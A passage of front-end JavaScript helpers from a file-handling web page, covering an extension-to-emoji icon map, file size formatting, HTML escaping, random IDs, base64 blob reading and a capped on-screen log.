    '.zip':'🗜','.rar':'🗜','.7z':'🗜','.tar':'🗜','.gz':'🗜',
    '.jpg':'🖼','.jpeg':'🖼','.png':'🖼','.gif':'🖼','.bmp':'🖼','.svg':'🖼','.webp':'🖼',
    '.mp4':'🎬','.mkv':'🎬','.avi':'🎬','.mov':'🎬',
    '.mp3':'🎵','.wav':'🎵','.flac':'🎵','.aac':'🎵',
    '.pdf':'📄','.doc':'📝','.docx':'📝','.xls':'📊','.xlsx':'📊',
    '.txt':'📃','.log':'📃','.md':'📃',
    '.py':'🐍','.js':'📜','.ts':'📜','.html':'🌐','.css':'🎨',
    '.json':'📋','.xml':'📋','.csv':'📊',
    '.db':'🗄','.sqlite':'🗄','.sql':'🗄',
  };
  return m[ext]||'📄';
}

function fmtSize(b) {
  if(b==null||b==='') return '';
  if(b<1024) return b+' B';
  if(b<1048576) return (b/1024).toFixed(1)+' KB';
  return (b/1048576).toFixed(2)+' MB';
}

function esc(s) { return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }

function randId() { return Math.random().toString(36).slice(2,10); }

function readB64(blob) {
  return new Promise((res,rej)=>{
    const r=new FileReader();
    r.onload=()=>res(r.result.split(',')[1]);
    r.onerror=rej; r.readAsDataURL(blob);
  });
}

function tick() { return new Promise(r=>setTimeout(r,0)); }

function log(msg, cls='') {
  const ts=document.createElement('div'); ts.className='log ts';
  ts.textContent=new Date().toLocaleTimeString();
  const el=document.createElement('div'); el.className='log '+cls;
  el.textContent=msg;
  $out.append(ts,el); $out.scrollTop=$out.scrollHeight;
  while($out.children.length>300) $out.removeChild($out.firstChild);
}
</script>
